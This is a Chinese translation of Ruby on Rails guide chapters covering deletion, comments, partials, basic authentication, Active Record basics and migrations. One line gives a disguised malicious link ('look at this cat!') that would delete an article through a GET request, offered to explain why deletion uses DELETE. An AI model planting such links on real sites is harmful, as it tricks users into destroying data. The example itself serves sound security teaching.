现在介绍 CRUD 中的 D，从数据库中删除文章。按照 REST 架构的约定，删除文章的路由是：
DELETE /articles/:id(.:format)      articles#destroy

删除资源时使用 DELETE 请求。如果还使用 GET 请求，可以构建如下所示的恶意地址：
<a href='http://example.com/articles/1/destroy'>look at this cat!</a>

删除资源使用 DELETE 方法，路由会把请求发往 app/controllers/articles_controller.rb 中的 destroy 动作。destroy 动作现在还不存在，下面来添加：
def destroy
  @article = Article.find(params[:id])
  @article.destroy
 
  redirect_to articles_path
end

想把记录从数据库删除，可以在 Active Record 对象上调用 destroy 方法。注意，我们无需为这个动作编写视图，因为它会转向 index 动作。

最后，在 index 动作的模板（app/views/articles/index.html.erb）中加上“Destroy”链接：
<h1>Listing Articles</h1>
<%= link_to 'New article', new_article_path %>
<table>
  <tr>
    <th>Title</th>
    <th>Text</th>
    <th colspan="3"></th>
  </tr>
 
<% @articles.each do |article| %>
  <tr>
    <td><%= article.title %></td>
    <td><%= article.text %></td>
    <td><%= link_to 'Show', article_path(article) %></td>
    <td><%= link_to 'Edit', edit_article_path(article) %></td>
    <td><%= link_to 'Destroy', article_path(article),
                    method: :delete, data: { confirm: 'Are you sure?' } %></td>
  </tr>
<% end %>
</table>

生成“Destroy”链接的 link_to 用法有点不一样，第二个参数是具名路由，随后还传入了几个参数。:method 和 :'data-confirm' 选项设置链接的 HTML5 属性，点击链接后，首先会显示一个对话框，然后发起 DELETE 请求。这两个操作通过 jquery_ujs 这个 JavaScript 脚本实现。生成程序骨架时，会自动把 jquery_ujs 加入程序的布局中（app/views/layouts/application.html.erb）。没有这个脚本，就不会显示确认对话框。

确认对话框

恭喜，现在你可以新建、显示、列出、更新、删除文章了。

一般情况下，Rails 建议使用资源对象，而不手动设置路由。关于路由的详细介绍参阅“Rails 路由全解”一文。


##  6 添加第二个模型

接下来要在程序中添加第二个模型，用来处理文章的评论。

###  6.1 生成模型

下面要用到的生成器，和之前生成 Article 模型的一样。我们要创建一个 Comment 模型，表示文章的评论。在终端执行下面的命令：
$ rails generate model Comment commenter:string body:text article:references

这个命令生成四个文件：
文件 	作用
db/migrate/20140120201010_create_comments.rb 	生成 comments 表所用的迁移文件（你得到的文件名稍有不同）
app/models/comment.rb 	Comment 模型文件
test/models/comment_test.rb 	Comment 模型的测试文件
test/fixtures/comments.yml 	测试时使用的固件

首先来看一下 app/models/comment.rb 文件：
class Comment < ActiveRecord::Base
  belongs_to :article
end

文件的内容和前面的 Article 模型差不多，不过多了一行代码：belongs_to :article。这行代码用来建立 Active Record 关联。下文会简单介绍关联。

除了模型文件，Rails 还生成了一个迁移文件，用来创建对应的数据表：
class CreateComments < ActiveRecord::Migration
  def change
    create_table :comments do |t|
      t.string :commenter
      t.text :body
 
      # this line adds an integer column called `article_id`.
      t.references :article, index: true
 
      t.timestamps
    end
  end
end

t.references 这行代码为两个模型的关联创建一个外键字段，同时还为这个字段创建了索引。下面运行这个迁移：
$ rake db:migrate

Rails 相当智能，只会执行还没有运行的迁移，在命令行中会看到以下输出：
==  CreateComments: migrating =================================================
-- create_table(:comments)
   -> 0.0115s
==  CreateComments: migrated (0.0119s) ========================================

###  6.2 模型关联

使用 Active Record 关联可以轻易的建立两个模型之间的关系。评论和文章之间的关联是这样的：

    评论属于一篇文章
    一篇文章有多个评论

这种关系和 Rails 用来声明关联的句法具有相同的逻辑。我们已经看过 Comment 模型中那行代码，声明评论属于文章：
class Comment < ActiveRecord::Base
  belongs_to :article
end

我们要编辑 app/models/article.rb 文件，加入这层关系的另一端：
class Article < ActiveRecord::Base
  has_many :comments
  validates :title, presence: true,
                    length: { minimum: 5 }
end

这两行声明能自动完成很多操作。例如，如果实例变量 @article 是一个文章对象，可以使用 @article.comments 取回一个数组，其元素是这篇文章的评论。

关于 Active Record 关联的详细介绍，参阅“Active Record 关联”一文。

###  6.3 添加评论的路由

和 article 控制器一样，添加路由后 Rails 才知道在哪个地址上查看评论。打开 config/routes.rb 文件，按照下面的方式修改：
resources :articles do
  resources :comments
end

我们把 comments 放在 articles 中，这叫做嵌套资源，表明了文章和评论间的层级关系。

关于路由的详细介绍，参阅“Rails 路由全解”一文。

###  6.4 生成控制器

有了模型，下面要创建控制器了，还是使用前面用过的生成器：
$ rails generate controller Comments

这个命令生成六个文件和一个空文件夹：
文件/文件夹 	作用
app/controllers/comments_controller.rb 	        Comments 控制器文件
app/views/comments/                     	控制器的视图存放在这个文件夹里
test/controllers/comments_controller_test.rb 	控制器测试文件
app/helpers/comments_helper.rb          	视图帮助方法文件
test/helpers/comments_helper_test.rb		帮助方法测试文件
app/assets/javascripts/comment.js.coffee 	控制器的 CoffeeScript 文件
app/assets/stylesheets/comment.css.scss 	控制器的样式表文件

在任何一个博客中，读者读完文章后就可以发布评论。评论发布后，会转向文章显示页面，查看自己的评论是否显示出来了。所以，CommentsController 中要定义新建评论的和删除垃圾评论的方法。

首先，修改显示文章的模板（app/views/articles/show.html.erb），允许读者发布评论：
<p>
  <strong>Title:</strong>
  <%= @article.title %>
</p>
 
<p>
  <strong>Text:</strong>
  <%= @article.text %>
</p>
 
<h2>Add a comment:</h2>
<%= form_for([@article, @article.comments.build]) do |f| %>
  <p>
    <%= f.label :commenter %><br>
    <%= f.text_field :commenter %>
  </p>
  <p>
    <%= f.label :body %><br>
    <%= f.text_area :body %>
  </p>
  <p>
    <%= f.submit %>
  </p>
<% end %>
 
<%= link_to 'Back', articles_path %>
| <%= link_to 'Edit', edit_article_path(@article) %>

上面的代码在显示文章的页面添加了一个表单，调用 CommentsController 控制器的 create 动作发布评论。form_for 的参数是个数组，构建嵌套路由，例如 /articles/1/comments。

下面在 app/controllers/comments_controller.rb 文件中定义 create 方法：
class CommentsController < ApplicationController
  def create
    @article = Article.find(params[:article_id])
    @comment = @article.comments.create(comment_params)
    redirect_to article_path(@article)
  end
 
  private
    def comment_params
      params.require(:comment).permit(:commenter, :body)
    end
end

这里使用的代码要比文章的控制器复杂得多，因为设置了嵌套关系，必须这么做评论功能才能使用。发布评论时要知道这个评论属于哪篇文章，所以要在 Article 模型上调用 find 方法查找文章对象。

而且，这段代码还充分利用了关联关系生成的方法。我们在 @article.comments 上调用 create 方法，创建并保存评论。这么做能自动把评论和文章联系起来，让这个评论属于这篇文章。

添加评论后，调用 article_path(@article) 帮助方法，转向原来的文章页面。前面说过，这个帮助函数调用 ArticlesController 的 show 动作，渲染 show.html.erb 模板。我们要在这个模板中显示评论，所以要修改一下 app/views/articles/show.html.erb：
<p>
  <strong>Title:</strong>
  <%= @article.title %>
</p>
 
<p>
  <strong>Text:</strong>
  <%= @article.text %>
</p>
 
<h2>Comments</h2>
<% @article.comments.each do |comment| %>
  <p>
    <strong>Commenter:</strong>
    <%= comment.commenter %>
  </p>
 
  <p>
    <strong>Comment:</strong>
    <%= comment.body %>
  </p>
<% end %>
 
<h2>Add a comment:</h2>
<%= form_for([@article, @article.comments.build]) do |f| %>
  <p>
    <%= f.label :commenter %><br>
    <%= f.text_field :commenter %>
  </p>
  <p>
    <%= f.label :body %><br>
    <%= f.text_area :body %>
  </p>
  <p>
    <%= f.submit %>
  </p>
<% end %>
 
<%= link_to 'Edit Article', edit_article_path(@article) %> |
<%= link_to 'Back to Articles', articles_path %>

现在，可以为文章添加评论了，成功添加后，评论会在正确的位置显示。

文章的评论


##  7 重构

现在博客的文章和评论都能正常使用了。看一下 app/views/articles/show.html.erb 模板，内容太多。下面使用局部视图重构。

###  7.1 渲染局部视图中的集合

首先，把显示文章评论的代码抽出来，写入局部视图中。新建 app/views/comments/_comment.html.erb 文件，写入下面的代码：
<p>
  <strong>Commenter:</strong>
  <%= comment.commenter %>
</p>
 
<p>
  <strong>Comment:</strong>
  <%= comment.body %>
</p>

然后把 app/views/articles/show.html.erb 修改成：
<p>
  <strong>Title:</strong>
  <%= @article.title %>
</p>
 
<p>
  <strong>Text:</strong>
  <%= @article.text %>
</p>
 
<h2>Comments</h2>
<%= render @article.comments %>
 
<h2>Add a comment:</h2>
<%= form_for([@article, @article.comments.build]) do |f| %>
  <p>
    <%= f.label :commenter %><br>
    <%= f.text_field :commenter %>
  </p>
  <p>
    <%= f.label :body %><br>
    <%= f.text_area :body %>
  </p>
  <p>
    <%= f.submit %>
  </p>
<% end %>
 
<%= link_to 'Edit Article', edit_article_path(@article) %> |
<%= link_to 'Back to Articles', articles_path %>

这个视图会使用局部视图 app/views/comments/_comment.html.erb 渲染 @article.comments 集合中的每个评论。render 方法会遍历 @article.comments 集合，把每个评论赋值给一个和局部视图同名的本地变量，在这个例子中本地变量是 comment，这个本地变量可以在局部视图中使用。

###  7.2 渲染局部视图中的表单

我们把添加评论的代码也移到局部视图中。新建 app/views/comments/_form.html.erb 文件，写入：
<%= form_for([@article, @article.comments.build]) do |f| %>
  <p>
    <%= f.label :commenter %><br>
    <%= f.text_field :commenter %>
  </p>
  <p>
    <%= f.label :body %><br>
    <%= f.text_area :body %>
  </p>
  <p>
    <%= f.submit %>
  </p>
<% end %>

然后把 app/views/articles/show.html.erb 改成：
<p>
  <strong>Title:</strong>
  <%= @article.title %>
</p>
 
<p>
  <strong>Text:</strong>
  <%= @article.text %>
</p>
 
<h2>Comments</h2>
<%= render @article.comments %>
 
<h2>Add a comment:</h2>
<%= render "comments/form" %>
 
<%= link_to 'Edit Article', edit_article_path(@article) %> |
<%= link_to 'Back to Articles', articles_path %>

第二个 render 方法的参数就是要渲染的局部视图，即 comments/form。Rails 很智能，能解析其中的斜线，知道要渲染 app/views/comments 文件夹中的 _form.html.erb 模板。

@article 变量在所有局部视图中都可使用，因为它是实例变量。


##  8 删除评论

博客还有一个重要的功能是删除垃圾评论。为了实现这个功能，要在视图中添加一个连接，并在 CommentsController 中定义 destroy 动作。

先在 app/views/comments/_comment.html.erb 局部视图中加入删除评论的链接：
<p>
  <strong>Commenter:</strong>
  <%= comment.commenter %>
</p>
 
<p>
  <strong>Comment:</strong>
  <%= comment.body %>
</p>
 
<p>
  <%= link_to 'Destroy Comment', [comment.article, comment],
               method: :delete,
               data: { confirm: 'Are you sure?' } %>
</p>

点击“Destroy Comment”链接后，会向 CommentsController 控制器发起 DELETE /articles/:article_id/comments/:id 请求。我们可以从这个请求中找到要删除的评论。下面在控制器中加入 destroy 动作（app/controllers/comments_controller.rb）：
class CommentsController < ApplicationController
  def create
    @article = Article.find(params[:article_id])
    @comment = @article.comments.create(comment_params)
    redirect_to article_path(@article)
  end
 
  def destroy
    @article = Article.find(params[:article_id])
    @comment = @article.comments.find(params[:id])
    @comment.destroy
    redirect_to article_path(@article)
  end
 
  private
    def comment_params
      params.require(:comment).permit(:commenter, :body)
    end
end

destroy 动作先查找当前文章，然后在 @article.comments 集合中找到对应的评论，将其从数据库中删掉，最后转向显示文章的页面。
###  8.1 删除关联对象

如果删除一篇文章，也要删除文章中的评论，不然这些评论会占用数据库空间。在 Rails 中可以在关联中指定 dependent 选项达到这一目的。把 Article 模型（app/models/article.rb）修改成：
class Article < ActiveRecord::Base
  has_many :comments, dependent: :destroy
  validates :title, presence: true,
                    length: { minimum: 5 }
end

##  9 安全
###  9.1 基本认证

如果把这个博客程序放在网上，所有人都能添加、编辑、删除文章和评论。

Rails 提供了一种简单的 HTTP 身份认证机制可以避免出现这种情况。

在 ArticlesController 中，我们要用一种方法禁止未通过认证的用户访问其中几个动作。我们需要的是 http_basic_authenticate_with 方法，通过这个方法的认证后才能访问所请求的动作。

要使用这个身份认证机制，需要在 ArticlesController 控制器的顶部调用 http_basic_authenticate_with 方法。除了 index 和 show 动作，访问其他动作都要通过认证，所以在 app/controllers/articles_controller.rb 中，要这么做：
class ArticlesController < ApplicationController
 
  http_basic_authenticate_with name: "dhh", password: "secret", except: [:index, :show]
 
  def index
    @articles = Article.all
  end
 
  # snipped for brevity

同时，我们还希望只有通过认证的用户才能删除评论。修改 CommentsController 控制器（app/controllers/comments_controller.rb）：
class CommentsController < ApplicationController
 
  http_basic_authenticate_with name: "dhh", password: "secret", only: :destroy
 
  def create
    @article = Article.find(params[:article_id])
    ...
  end
 
  # snipped for brevity

现在，如果想新建文章，会看到一个 HTTP 基本认证对话框。

HTTP 基本认证对话框

其他的身份认证方法也可以在 Rails 程序中使用。其中两个比较流行的是 Devise 引擎和 Authlogic gem。

###  9.2 其他安全注意事项

安全，尤其是在网页程序中，是个很宽泛和值得深入研究的领域。Rails 程序的安全措施，在“Ruby on Rails 安全指南”中有更深入的说明。

#  10 接下来做什么

至此，我们开发了第一个 Rails 程序，请尽情的修改、试验。在开发过程中难免会需要帮助，如果使用 Rails 时需要协助，可以使用这些资源：

    Ruby on Rails 指南
    Ruby on Rails 教程
    Ruby on Rails 邮件列表
    irc.freenode.net 上的 #rubyonrails 频道

Rails 本身也提供了帮助文档，可以使用下面的 rake 任务生成：

    运行 rake doc:guides，会在程序的 doc/guides 文件夹中生成一份 Rails 指南。在浏览器中打开 doc/guides/index.html 可以查看这份指南。
    运行 rake doc:rails，会在程序的 doc/api 文件夹中生成一份完整的 API 文档。在浏览器中打开 doc/api/index.html 可以查看 API 文档。

使用 doc:guides 任务在本地生成 Rails 指南，要安装 RedCloth gem。在 Gemfile 中加入这个 gem，然后执行 bundle install 命令即可。

##  11 常见问题

使用 Rails 时，最好使用 UTF-8 编码存储所有外部数据。如果没使用 UTF-8 编码，Ruby 的代码库和 Rails 一般都能将其转换成 UTF-8，但不一定总能成功，所以最好还是确保所有的外部数据都使用 UTF-8 编码。

如果编码出错，常见的征兆是浏览器中显示很多黑色方块和问号。还有一种常见的符号是“Ã¼”，包含在“ü”中。Rails 内部采用很多方法尽量避免出现这种问题。如果你使用的外部数据编码不是 UTF-8，有时会出现这些问题，Rails 无法自动纠正。

非 UTF-8 编码的数据经常来源于：

    你的文本编辑器：大多数文本编辑器（例如 TextMate）默认使用 UTF-8 编码保存文件。如果你的编辑器没使用 UTF-8 编码，有可能是你在模板中输入了特殊字符（例如 é），在浏览器中显示为方块和问号。这种问题也会出现在国际化文件中。默认不使用 UTF-8 保存文件的编辑器（例如 Dreamweaver 的某些版本）都会提供一种方法，把默认编码设为 UTF-8。记得要修改。
    你的数据库：默认情况下，Rails 会把从数据库中取出的数据转换成 UTF-8 格式。如果数据库内部不使用 UTF-8 编码，就无法保存用户输入的所有字符。例如，数据库内部使用 Latin-1 编码，用户输入俄语、希伯来语或日语字符时，存进数据库时就会永远丢失。如果可能，在数据库中尽量使用 UTF-8 编码。

##  反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  Active Record 基础

本文介绍 Active Record。

读完本文，你将学到：

    对象关系映射（Object Relational Mapping，ORM）和 Active Record 是什么，以及如何在 Rails 中使用；
    Active Record 在 MVC 中的作用；
    如何使用 Active Record 模型处理保存在关系型数据库中的数据；
    Active Record 模式（schema）命名约定；
    数据库迁移，数据验证和回调；

Chapters

    Active Record 是什么？
        Active Record 模式
        对象关系映射
        Active Record 用作 ORM 框架
    Active Record 中的“多约定少配置”原则
        命名约定
        模式约定
    创建 Active Record 模型
    不用默认的命名约定
    CRUD：读写数据
        创建
        读取
        更新
        删除
    数据验证
    回调
    迁移

##  1 Active Record 是什么？

Active Record 是 MVC 中的 M（模型），处理数据和业务逻辑。Active Record 负责创建和使用需要持久存入数据库中的数据。Active Record 实现了 Active Record 模式，是一种对象关系映射系统。

###  1.1 Active Record 模式

Active Record 模式出自 Martin Fowler 的《企业应用架构模式》一书。在 Active Record 模式中，对象中既有持久存储的数据，也有针对数据的操作。Active Record 模式把数据存取逻辑作为对象的一部分，处理对象的用户知道如何把数据写入数据库，以及从数据库中读出数据。

###  1.2 对象关系映射

对象关系映射（ORM）是一种技术手段，把程序中的对象和关系型数据库中的数据表连接起来。使用 ORM，程序中对象的属性和对象之间的关系可以通过一种简单的方法从数据库获取，无需直接编写 SQL 语句，也不过度依赖特定的数据库种类。

###  1.3 Active Record 用作 ORM 框架

Active Record 提供了很多功能，其中最重要的几个如下：

    表示模型和其中的数据；
    表示模型之间的关系；
    通过相关联的模型表示集成关系；
    持久存入数据库之前，验证模型；
    以面向对象的方式处理数据库操作；

##  2 Active Record 中的“多约定少配置”原则

使用其他编程语言或框架开发程序时，可能必须要编写很多配置代码。大多数的 ORM 框架都是这样。但是，如果遵循 Rails 的约定，创建 Active Record 模型时不用做多少配置（有时甚至完全不用配置）。Rails 的理念是，如果大多数情况下都要使用相同的方式配置程序，那么就应该把这定为默认的方法。所以，只有常规的方法无法满足要求时，才要额外的配置。

###  2.1 命名约定

默认情况下，Active Record 使用一些命名约定，查找模型和数据表之间的映射关系。Rails 把模型的类名转换成复数，然后查找对应的数据表。例如，模型类名为 Book，数据表就是 books。Rails 提供的单复数变形功能很强大，常见和不常见的变形方式都能处理。如果类名由多个单词组成，应该按照 Ruby 的约定，使用驼峰式命名法，这时对应的数据表将使用下划线分隔各单词。因此：

    数据表名：复数，下划线分隔单词（例如 book_clubs）
    模型类名：单数，每个单词的首字母大写（例如 BookClub）

模型 / 类 	数据表 / 模式
Post 	posts
LineItem 	line_items
Deer 	deers
Mouse 	mice
Person 	people

###  2.2 模式约定

根据字段的作用不同，Active Record 对数据表中的字段命名也做了相应的约定：

    外键 - 使用 singularized_table_name_id 形式命名，例如 item_id，order_id。创建模型关联后，Active Record 会查找这个字段；
    主键 - 默认情况下，Active Record 使用整数字段 id 作为表的主键。使用 Active Record 迁移创建数据表时，会自动创建这个字段；

还有一些可选的字段，能为 Active Record 实例添加更多的功能：

    created_at - 创建记录时，自动设为当前的时间戳；
    updated_at - 更新记录时，自动设为当前的时间戳；
    lock_version - 在模型中添加乐观锁定功能；
    type - 让模型使用单表继承；
    (association_name)_type - 多态关联的类型；
    (table_name)_count - 缓存关联对象的数量。例如，posts 表中的 comments_count 字段，缓存每篇文章的评论数；

虽然这些字段是可选的，但在 Active Record 中是被保留的。如果想使用相应的功能，就不要把这些保留字段用作其他用途。例如，type 这个保留字段是用来指定数据表使用“单表继承”（STI）的，如果不用 STI，请使用其他的名字，例如“context”，这也能表明该字段的作用。

##  3 创建 Active Record 模型

创建 Active Record 模型的过程很简单，只要继承 ActiveRecord::Base 类就行了：
class Product < ActiveRecord::Base
end

上面的代码会创建 Product 模型，对应于数据库中的 products 表。同时，products 表中的字段也映射到 Product 模型实例的属性上。假如 products 表由下面的 SQL 语句创建：
CREATE TABLE products (
   id int(11) NOT NULL auto_increment,
   name varchar(255),
   PRIMARY KEY  (id)
);

按照这样的数据表结构，可以编写出下面的代码：
p = Product.new
p.name = "Some Book"
puts p.name # "Some Book"

##  4 不用默认的命名约定

如果想使用其他的命名约定，或者在 Rails 程序中使用即有的数据库可以吗？没问题，不用默认的命名约定也很简单。

使用 ActiveRecord::Base.table_name= 方法可以指定数据表的名字：
class Product < ActiveRecord::Base
  self.table_name = "PRODUCT"
end

如果这么做，还要在测试中调用 set_fixture_class 方法，手动指定固件（class_name.yml）的类名：
class FunnyJoke < ActiveSupport::TestCase
  set_fixture_class funny_jokes: Joke
  fixtures :funny_jokes
  ...
end

还可以使用 ActiveRecord::Base.primary_key= 方法指定数据表的主键：
class Product < ActiveRecord::Base
  self.primary_key = "product_id"
end

##  5 CRUD：读写数据

CURD 是四种数据操作的简称：C 表示创建，R 表示读取，U 表示更新，D 表示删除。Active Record 自动创建了处理数据表中数据的方法。

###  5.1 创建

Active Record 对象可以使用 Hash 创建，在块中创建，或者创建后手动设置属性。new 方法创建一个新对象，create 方法创建新对象，并将其存入数据库。

例如，User 模型中有两个属性，name 和 occupation。调用 create 方法会创建一个新纪录，并存入数据库：
user = User.create(name: "David", occupation: "Code Artist")

使用 new 方法，可以实例化一个新对象，但不会保存：
user = User.new
user.name = "David"
user.occupation = "Code Artist"

调用 user.save 可以把记录存入数据库。

如果在 create 和 new 方法中使用块，会把新创建的对象拉入块中：
user = User.new do |u|
  u.name = "David"
  u.occupation = "Code Artist"
end
###  5.2 读取

Active Record 为读取数据库中的数据提供了丰富的 API。下面举例说明。
# return a collection with all users
users = User.all
# return the first user
user = User.first
# return the first user named David
david = User.find_by(name: 'David')
# find all users named David who are Code Artists and sort by created_at
# in reverse chronological order
users = User.where(name: 'David', occupation: 'Code Artist').order('created_at DESC')

Active Record 查询一文会详细介绍查询 Active Record 模型的方法。

###  5.3 更新

得到 Active Record 对象后，可以修改其属性，然后再存入数据库。
user = User.find_by(name: 'David')
user.name = 'Dave'
user.save

还有个简写方式，使用 Hash，指定属性名和属性值，例如：
user = User.find_by(name: 'David')
user.update(name: 'Dave')

一次更新多个属性时使用这种方法很方便。如果想批量更新多个记录，可以使用类方法 update_all：
User.update_all "max_login_attempts = 3, must_change_password = 'true'"

###  5.4 删除

类似地，得到 Active Record 对象后还可以将其销毁，从数据库中删除。
user = User.find_by(name: 'David')
user.destroy

##  6 数据验证

在存入数据库之前，Active Record 还可以验证模型。模型验证有很多方法，可以检查属性值是否不为空、是否是唯一的，或者没有在数据库中出现过，等等。

把数据存入数据库之前进行验证是十分重要的步骤，所以调用 create、save、update 这三个方法时会做数据验证，验证失败时返回 false，此时不会对数据库做任何操作。这三个方法都要对应的爆炸方法（create!，save!，update!），爆炸方法要严格一些，如果验证失败，会抛出 ActiveRecord::RecordInvalid 异常。下面是个简单的例子：
class User < ActiveRecord::Base
  validates :name, presence: true
end
 
User.create  # => false
User.create! # => ActiveRecord::RecordInvalid: Validation failed: Name can't be blank

Active Record 数据验证一文会详细介绍数据验证。

##  7 回调

Active Record 回调可以在模型声明周期的特定事件上绑定代码，相应的事件发生时，执行这些代码。例如创建新纪录时，更新记录时，删除记录时，等等。Active Record 回调一文会详细介绍回调。

##  8 迁移

Rails 提供了一个 DSL 用来处理数据库模式，叫做“迁移”。迁移的代码存储在特定的文件中，通过 rake 调用，可以用在 Active Record 支持的所有数据库上。下面这个迁移会新建一个数据表：
class CreatePublications < ActiveRecord::Migration
  def change
    create_table :publications do |t|
      t.string :title
      t.text :description
      t.references :publication_type
      t.integer :publisher_id
      t.string :publisher_type
      t.boolean :single_issue
 
      t.timestamps
    end
    add_index :publications, :publication_type_id
  end
end

Rails 会跟踪哪些迁移已经应用到数据库中，还提供了回滚功能。创建数据表要执行 rake db:migrate 命令；回滚操作要执行 rake db:rollback 命令。

注意，上面的代码和具体的数据库种类无关，可用于 MySQL、PostgreSQL、Oracle 等数据库。关于迁移的详细介绍，参阅 Active Record 迁移一文。

##  反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  Active Record 数据库迁移

迁移是 Active Record 提供的一个功能，按照时间顺序管理数据库模式。使用迁移，无需编写 SQL，使用简单的 Ruby DSL 就能修改数据表。

读完本文，你将学到：

    生成迁移文件的生成器；
    Active Record 提供用来修改数据库的方法；
    管理迁移和数据库模式的 Rake 任务；
    迁移和 schema.rb 文件的关系；

Chapters

    迁移简介
    创建迁移
        单独创建迁移
        模型生成器
        支持的类型修饰符
    编写迁移
        创建数据表
        创建联合数据表
        修改数据表
        如果帮助方法不够用
        使用 change 方法
        使用 reversible 方法
        使用 up 和 down 方法
        撤销之前的迁移
    运行迁移
        回滚
        搭建数据库
        重建数据库
        运行指定的迁移
        在不同的环境中运行迁移
        修改运行迁移时的输出
    修改现有的迁移
    导出模式
        模式文件的作用
        导出的模式文件类型
        模式导出和版本控制
    Active Record 和引用完整性
    迁移和种子数据

##  1 迁移简介

迁移使用一种统一、简单的方式，按照时间顺序修改数据库的模式。迁移使用 Ruby DSL 编写，因此不用手动编写 SQL 语句，对数据库的操作和所用的数据库种类无关。

你可以把每个迁移看做数据库的一个修订版本。数据库中一开始什么也没有，各个迁移会添加或删除数据表、字段或记录。Active Record 知道如何按照时间线更新数据库，不管数据库现在的模式如何，都能更新到最新结构。同时，Active Record 还会更新 db/schema.rb 文件，匹配最新的数据库结构。

下面是一个迁移示例：
class CreateProducts < ActiveRecord::Migration
  def change
    create_table :products do |t|
      t.string :name
      t.text :description
 
      t.timestamps
    end
  end
end

这个迁移创建了一个名为 products 的表，然后在表中创建字符串字段 name 和文本字段 description。名为 id 的主键字段会被自动创建。id 字段是所有 Active Record 模型的默认主键。timestamps 方法创建两个字段：created_at 和 updated_at。如果数据表中有这两个字段，Active Record 会负责操作。

注意，对数据库的改动按照时间向前 推移。运行迁移之前，数据表还不存在。运行迁移后，才会创建数据表。Active Record 知道如何撤销迁移，如果回滚这次迁移，数据表会被删除。

在支持事务的数据库中，对模式的改动会在一个事务中执行。如果数据库不支持事务，迁移失败时，成功执行的操作将无法回滚。如要回滚，必须手动改回来。

某些查询无法在事务中运行。如果适配器支持 DDL 事务，可以在某个迁移中调用 disable_ddl_transaction! 方法禁用。

如果想在迁移中执行 Active Record 不知如何撤销的操作，可以使用 reversible 方法：
class ChangeProductsPrice < ActiveRecord::Migration
  def change
    reversible do |dir|
      change_table :products do |t|
        dir.up   { t.change :price, :string }
        dir.down { t.change :price, :integer }
      end
    end
  end
end

或者不用 change 方法，分别使用 up 和 down 方法：
class ChangeProductsPrice < ActiveRecord::Migration
  def up
    change_table :products do |t|
      t.change :price, :string
    end
  end
 
  def down
    change_table :products do |t|
      t.change :price, :integer
    end
  end
end

##  2 创建迁移
###  2.1 单独创建迁移

迁移文件存储在 db/migrate 文件夹中，每个迁移保存在一个文件中。文件名采用 YYYYMMDDHHMMSS_create_products.rb 形式，即一个 UTC 时间戳后加以下划线分隔的迁移名。迁移的类名（驼峰式）要和文件名时间戳后面的部分匹配。例如，在 20080906120000_create_products.rb 文件中要定义 CreateProducts 类；在 20080906120001_add_details_to_products.rb 文件中要定义 AddDetailsToProducts 类。文件名中的时间戳决定要运行哪个迁移，以及按照什么顺序运行。从其他程序中复制迁移，或者自己生成迁移时，要注意运行的顺序。

自己计算时间戳不是件简单的事，所以 Active Record 提供了一个生成器：
$ rails generate migration AddPartNumberToProducts

这个命令生成一个空的迁移，但名字已经起好了：
class AddPartNumberToProducts < ActiveRecord::Migration
  def change
  end
end

如果迁移的名字是“AddXXXToYYY”或者“RemoveXXXFromYYY”这种格式，而且后面跟着一个字段名和类型列表，那么迁移中会生成合适的 add_column 或 remove_column 语句。
$ rails generate migration AddPartNumberToProducts part_number:string

这个命令生成的迁移如下：
class AddPartNumberToProducts < ActiveRecord::Migration
  def change
    add_column :products, :part_number, :string
  end
end

如果想为新建的字段创建添加索引，可以这么做：
$ rails generate migration AddPartNumberToProducts part_number:string:index

这个命令生成的迁移如下：
class AddPartNumberToProducts < ActiveRecord::Migration
  def change
    add_column :products, :part_number, :string
    add_index :products, :part_number
  end
end

类似地，还可以生成删除字段的迁移：
$ rails generate migration RemovePartNumberFromProducts part_number:string

这个命令生成的迁移如下：
class RemovePartNumberFromProducts < ActiveRecord::Migration
  def change
    remove_column :products, :part_number, :string
  end
end

迁移生成器不单只能创建一个字段，例如：
$ rails generate migration AddDetailsToProducts part_number:string price:decimal

生成的迁移如下：
class AddDetailsToProducts < ActiveRecord::Migration
  def change
    add_column :products, :part_number, :string
    add_column :products, :price, :decimal
  end
end

如果迁移名是“CreateXXX”形式，后面跟着一串字段名和类型声明，迁移就会创建名为“XXX”的表，以及相应的字段。例如：
$ rails generate migration CreateProducts name:string part_number:string

生成的迁移如下：
class CreateProducts < ActiveRecord::Migration
  def change
    create_table :products do |t|
      t.string :name
      t.string :part_number
    end
  end
end

生成器生成的只是一些基础代码，你可以根据需要修改 db/migrate/YYYYMMDDHHMMSS_add_details_to_products.rb 文件，增删代码。

在生成器中还可把字段类型设为 references（还可使用 belongs_to）。例如：
$ rails generate migration AddUserRefToProducts user:references

生成的迁移如下：
class AddUserRefToProducts < ActiveRecord::Migration
  def change
    add_reference :products, :user, index: true
  end
end

这个迁移会创建 user_id 字段，并建立索引。

如果迁移名中包含 JoinTable，生成器还会创建联合数据表：
rails g migration CreateJoinTableCustomerProduct customer product

生成的迁移如下：
class CreateJoinTableCustomerProduct < ActiveRecord::Migration
  def change
    create_join_table :customers, :products do |t|
      # t.index [:customer_id, :product_id]
      # t.index [:product_id, :customer_id]
    end
  end
end

###  2.2 模型生成器

模型生成器和脚手架生成器会生成合适的迁移，创建模型。迁移中会包含创建所需数据表的代码。如果在生成器中指定了字段，还会生成创建字段的代码。例如，运行下面的命令：
$ rails generate model Product name:string description:text

会生成如下的迁移：
class CreateProducts < ActiveRecord::Migration
  def change
    create_table :products do |t|
      t.string :name
      t.text :description
 
      t.timestamps
    end
  end
end

字段的名字和类型数量不限。

###  2.3 支持的类型修饰符

在字段类型后面，可以在花括号中添加选项。可用的修饰符如下：

    limit：设置 string/text/binary/integer 类型字段的最大值；
    precision：设置 decimal 类型字段的精度，即数字的位数；
